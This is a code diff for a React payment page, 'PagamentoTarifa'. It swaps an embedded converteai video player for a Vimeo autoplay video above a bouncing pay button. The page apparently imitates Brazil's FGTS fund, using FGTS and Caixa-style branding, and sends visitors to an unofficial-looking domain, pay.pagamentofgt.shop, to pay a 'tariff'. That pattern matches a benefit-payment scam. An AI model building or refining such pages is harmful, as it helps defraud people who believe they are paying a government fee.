@@ -4,7 +4,7 @@ import logofgts from "../assets/fgts2.png";
 // import caixa from "../assets/logo.png";
 import pix from "../assets/pix.png";
 import { IoIosWarning } from "react-icons/io";
-import { Helmet } from "react-helmet";
+import Vimeo from '@u-wave/react-vimeo';
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
 // import box from "../assets/carro.png"
@@ -91,9 +91,7 @@ export function PagamentoTarifa() {
 
     return (
         <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">
-            <Helmet>
-                <title>Pagamento com Desconto</title>
-            </Helmet>
+
 
             {/* Cabeçalho com logotipo, saudação e logo FGTS */}
             <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] ">
@@ -112,12 +110,10 @@ export function PagamentoTarifa() {
 
                 <span className="text-xl">ASSISTA O VÍDEO PARA ENTENDER</span>
 
-                <div className="w-full  py-4">
-                    <div dangerouslySetInnerHTML={{ __html: '<div id="vid_673b937b7c9d41000b963f82" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_673b937b7c9d41000b963f82" src="https://images.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b937b7c9d41000b963f82/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_673b937b7c9d41000b963f82" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div>' }} />
-                    <Helmet>
-                        <script type="text/javascript" id="scr_673b937b7c9d41000b963f82"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b937b7c9d41000b963f82/player.js", s.async=!0,document.head.appendChild(s); </script>
-                    </Helmet>
-                </div>
+                <Vimeo
+                    video="1032189936"
+                    autoplay
+                />
 
                 <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
                     <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
